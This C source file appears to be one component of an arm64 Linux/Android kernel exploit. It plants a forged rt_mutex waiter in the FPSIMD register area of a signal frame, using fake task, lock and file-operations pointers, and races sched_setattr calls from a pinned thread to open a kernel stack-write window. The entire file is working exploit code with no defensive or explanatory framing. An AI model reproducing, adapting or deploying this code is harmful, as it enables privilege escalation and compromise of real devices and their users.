#include "common.h"

#if SLIDE_USE_FPSIMD

_Static_assert(FPSIMD_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
               "FPSIMD waiter must fit in the vregs alias window");
_Static_assert(sizeof(struct fpsimd_context) >= sizeof(struct _aarch64_ctx),
               "unexpected fpsimd_context layout");

static uint64_t fpsimd_tree_parent;
static uint64_t fpsimd_tree_right;
static uint64_t fpsimd_tree_left;
static uint64_t fpsimd_pi_parent;
static uint64_t fpsimd_pi_right;
static uint64_t fpsimd_pi_left;
static uint64_t fpsimd_task;
static uint64_t fpsimd_lock;
static uint32_t fpsimd_prio;

static atomic_int fpsimd_handler_status;
static atomic_int fpsimd_record_size;

static void fpsimd_handler(int signal_number, siginfo_t *info,
                           void *raw_context) {
  ucontext_t *context = raw_context;
  uint8_t *cursor = (uint8_t *)context->uc_mcontext.__reserved;
  uint8_t *end = cursor + sizeof(context->uc_mcontext.__reserved);
  struct fpsimd_context *fpsimd = NULL;

  (void)signal_number;
  (void)info;
  while (cursor + sizeof(struct _aarch64_ctx) <= end) {
    struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;

    if (!header->magic && !header->size) {
      break;
    }
    if (header->size < sizeof(*header) || (header->size & 15) ||
        cursor + header->size > end) {
      atomic_store(&fpsimd_handler_status, -1);
      return;
    }
    if (header->magic == FPSIMD_MAGIC) {
      if (header->size < sizeof(struct fpsimd_context)) {
        atomic_store(&fpsimd_handler_status, -2);
        return;
      }
      fpsimd = (struct fpsimd_context *)header;
      atomic_store(&fpsimd_record_size, (int)header->size);
    }
    cursor += header->size;
  }
  if (!fpsimd) {
    atomic_store(&fpsimd_handler_status, -3);
    return;
  }
  put_fake_waiter((unsigned char *)fpsimd->vregs, FPSIMD_WAITER_OFF,
                  fpsimd_tree_parent, fpsimd_tree_right, fpsimd_tree_left,
                  fpsimd_pi_parent, fpsimd_pi_right, fpsimd_pi_left,
                  fpsimd_task, fpsimd_lock, fpsimd_prio);
  atomic_store(&fpsimd_handler_status, 1);
}

static void fpsimd_install_handler(void) {
  struct sigaction action = {
      .sa_sigaction = fpsimd_handler,
      .sa_flags = SA_SIGINFO,
  };

  SYSCHK(sigemptyset(&action.sa_mask));
  SYSCHK(sigaction(SIGUSR2, &action, NULL));
}

void slide_fpsimd_stack_copy(void) {
  static pthread_once_t once = PTHREAD_ONCE_INIT;
  uintptr_t tree_parent = slide_oracle_parent;
  uintptr_t tree_right = 0;
  uintptr_t tree_left = slide_oracle_target;
  uintptr_t pi_parent = slide_oracle_parent;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = slide_oracle_target;

  pthread_once(&once, fpsimd_install_handler);

#if defined(PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    tree_right = slide_oracle_target;
    tree_left = 0;
    pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
    pi_right = 0;
    pi_left = 0;
  }
#endif

  fpsimd_tree_parent = tree_parent;
  fpsimd_tree_right = tree_right;
  fpsimd_tree_left = tree_left;
  fpsimd_pi_parent = pi_parent;
  fpsimd_pi_right = pi_right;
  fpsimd_pi_left = pi_left;
  fpsimd_task = fake_task;
  fpsimd_lock = fake_lock;
  fpsimd_prio = FAKE_WAITER_PRIO;

  slide_reset_consume_state();

  int tid = atomic_load(&slide_waiter_tid);
  atomic_store(&fpsimd_handler_status, 0);
  atomic_store(&fpsimd_record_size, 0);
  errno = 0;
  long tg = syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
  while (!atomic_load(&fpsimd_handler_status))
    __asm__ volatile("yield" ::: "memory");
  int hstatus = atomic_load(&fpsimd_handler_status);
  int recsz = atomic_load(&fpsimd_record_size);

  atomic_store(&slide_consume_go, 1);
  while (!atomic_load(&slide_consume_stop))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&slide_consume_go, 0);

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               tg == 0 && hstatus == 1 && sched_ok > 0);
  pr_info("slide fpsimd tid=%d tgkill=%ld status=%d record=%d "
          "waiter_off=%#x calls=%d sched_ok=%d last_sched_ret=%d "
          "last_sched_errno=%d\n",
          tid, tg, hstatus, recsz, FPSIMD_WAITER_OFF,
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
}

void *slide_fpsimd_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    int tid = atomic_load(&slide_waiter_tid);

    if (seq == 1) {
      slide_apply_route_fine_delay();
    }

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    *errno_ptr = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

#endif /* SLIDE_USE_FPSIMD */